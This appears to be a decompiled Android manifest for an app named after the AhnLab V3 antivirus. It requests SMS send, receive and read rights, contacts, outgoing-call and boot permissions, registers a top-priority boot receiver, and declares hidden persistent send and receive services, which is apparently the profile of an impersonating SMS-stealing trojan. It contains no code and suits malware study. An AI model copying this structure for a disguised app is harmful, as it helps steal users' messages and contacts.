<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="1" android:versionName="3.0.1.1" package="com.plus.v3mobi.ahnlab">
  <uses-sdk android:minSdkVersion="8" android:targetSdkVersion="18"/>
  <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
  <uses-permission android:name="android.permission.RECEIVE_SMS"/>
  <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
  <uses-permission android:name="android.permission.READ_CONTACTS"/>
  <uses-permission android:name="android.permission.INTERNET"/>
  <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
  <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
  <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
  <uses-permission android:name="android.permission.WRITE_SMS"/>
  <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
  <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
  <uses-permission android:name="android.permission.READ_SMS"/>
  <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS"/>
  <uses-permission android:name="android.permission.VIBRATE"/>
  <uses-permission android:name="android.permission.GET_TASKS"/>
  <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
  <uses-permission android:name="android.permission.SEND_SMS"/>
  <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES"/>
  <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT"/>
  <application android:label="@7F070001" android:icon="@7F020007" android:name="com.plus.v3mobi.ahnlab.AppContext" android:persistent="true">
    <activity android:theme="@android:01030007" android:label="@7F070001" android:name="com.plus.v3mobi.ahnlab.MainActivity" android:exported="true" android:excludeFromRecents="true" android:launchMode="2">
      <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
      </intent-filter>
    </activity>
    <activity android:theme="@android:01030007" android:name="com.plus.v3mobi.ahnlab.UpdateActivity" android:excludeFromRecents="true" android:launchMode="2" android:screenOrientation="1" android:configChanges="0x000000A0"/>
    <activity android:theme="@android:0103000F" android:name="com.plus.v3mobi.ahnlab.V_Dialog" android:excludeFromRecents="true" android:screenOrientation="1"/>
    <receiver android:name="com.plus.v3mobi.ahnlab.receiver.SystemReceiver" android:exported="true">
      <intent-filter android:priority="2147483647">
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
        <action android:name="android.intent.action.ACTION_SHUTDOWN"/>
        <action android:name="android.intent.action.USER_PRESENT"/>
      </intent-filter>
    </receiver>
    <service android:name="com.plus.v3mobi.ahnlab.service.RecvService" android:persistent="true" android:enabled="true"/>
    <service android:name="com.plus.v3mobi.ahnlab.service.SendService" android:persistent="true" android:enabled="true"/>
    <service android:name="com.plus.v3mobi.ahnlab.service.BaseService" android:persistent="true" android:enabled="true"/>
  </application>
</manifest>
